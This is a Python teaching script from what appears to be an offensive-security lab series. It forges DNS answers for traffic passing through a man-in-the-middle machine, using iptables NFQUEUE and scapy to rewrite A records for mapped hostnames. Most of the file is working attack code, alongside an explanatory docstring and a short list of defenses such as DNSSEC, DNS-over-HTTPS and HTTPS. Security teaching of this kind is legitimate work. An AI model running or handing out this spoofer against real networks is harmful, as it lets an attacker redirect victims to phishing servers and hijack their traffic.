#!/usr/bin/env python3
"""
dns_spoofer.py — forge DNS answers for traffic flowing through you.

================================ THE LESSON ================================

WHERE THIS SITS
    This is the first of the "once you're the MITM" tools. It assumes
    arp_spoofer.py has redirected the target's traffic through your machine
    and IP forwarding is on. Now, instead of just reading traffic, we REWRITE
    it on the fly.

WHAT IS DNS?
    DNS turns a name into an IP: "example.com?" -> "93.184.216.34". Your
    browser can't connect to a name, only an IP, so every page load starts
    with a DNS question and answer (an "A record").

THE WEAKNESS: UNAUTHENTICATED, FORGEABLE ANSWERS
    Classic DNS (UDP port 53) has no authentication. Whoever answers first,
    wins. Since the target's query now passes through us, we can read the
    question ("example.com?") and substitute our own answer ("...is at
    10.0.0.5", our server). The target connects to us believing it reached the
    real site. This is how a phishing page can sit behind a real-looking name
    on a compromised network.

HOW IT WORKS — NFQUEUE + scapy
    We don't sniff passively here; we need to MODIFY and re-release packets.
    Linux `iptables` can divert packets into a userspace "netfilter queue":
        # forward chain: packets passing THROUGH us (the MITM case)
        iptables -I FORWARD -j NFQUEUE --queue-num 0
        # (for testing on your OWN machine, also do OUTPUT + INPUT)
    Our Python binds to queue 0. For each packet we:
        1. Parse it with scapy.
        2. If it's a DNS RESPONSE for a name we target, replace the answer
           record with our chosen IP and fix the length/checksum fields.
        3. Call packet.accept() to release the (modified) packet.
    Packets we don't care about are accepted unchanged.

=============================== THE PYTHON ================================
    * netfilterqueue — bind a Python callback to an iptables queue.
    * scapy DNS layers — DNS / DNSQR (question) / DNSRR (resource record).
    * dict lookups — a {hostname: fake_ip} map driving what we spoof.
    * deleting fields so scapy recomputes length/checksum (len/chksum = None).

=========================== DEFENSIVE TAKEAWAY ===========================
    * DNSSEC cryptographically signs DNS records so forged answers are rejected.
    * DNS-over-HTTPS / DNS-over-TLS (DoH/DoT) encrypt the query so a MITM can't
      even read it, let alone rewrite it.
    * The upstream defense is the same as all MITM attacks: stop the ARP
      spoofing (DAI, static ARP) so the attacker never sees the query, and use
      HTTPS so a wrong IP still can't present a valid certificate — the browser
      shows a certificate error instead of silently loading the fake site.

USAGE (inside your lab, as root):
    iptables -I FORWARD -j NFQUEUE --queue-num 0     # MITM case
    sudo python3 dns_spoofer.py
    # when done, undo the rule:
    iptables --flush
===========================================================================
"""

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR
from netfilterqueue import NetfilterQueue

# Which names to hijack, and the IP to answer with. Edit for your lab: point a
# test domain at your own attacker/web VM. The trailing dot matches how names
# appear on the wire (fully-qualified).
SPOOF_MAP = {
    "www.example.com.": "10.0.0.5",
    "example.com.": "10.0.0.5",
}


def process_packet(nfq_packet):
    """Callback for every packet iptables hands us.

    `nfq_packet` is a netfilterqueue object. get_payload() gives us the raw
    bytes, which we wrap in scapy's IP() to parse. At the end we MUST call
    either .accept() (release it) or .drop() (discard it), or the whole
    network stalls behind the queue.
    """
    scapy_packet = IP(nfq_packet.get_payload())

    # We only care about DNS answers (a response carries a DNSRR record).
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname.decode(errors="ignore")

        if qname in SPOOF_MAP:
            fake_ip = SPOOF_MAP[qname]
            print(f"[+] Spoofing {qname} -> {fake_ip}")

            # Replace the answer section with our own single A record.
            scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=fake_ip)
            scapy_packet[DNS].ancount = 1  # exactly one answer now

            # These fields depend on the packet's contents. By deleting them we
            # force scapy to recompute them when the packet is rebuilt, so the
            # target's OS accepts the packet as valid instead of dropping it.
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum

            # Hand the modified bytes back to the kernel.
            nfq_packet.set_payload(bytes(scapy_packet))

    nfq_packet.accept()  # release the packet (modified or not)


def main():
    queue = NetfilterQueue()
    try:
        queue.bind(0, process_packet)  # 0 must match --queue-num above
        print("[i] Bound to NFQUEUE 0. Ctrl+C to stop.")
        print("[i] Remember to set up and later flush your iptables rule.\n")
        queue.run()
    except KeyboardInterrupt:
        print("\n[i] Stopping. Don't forget: iptables --flush")
    finally:
        queue.unbind()


if __name__ == "__main__":
    main()
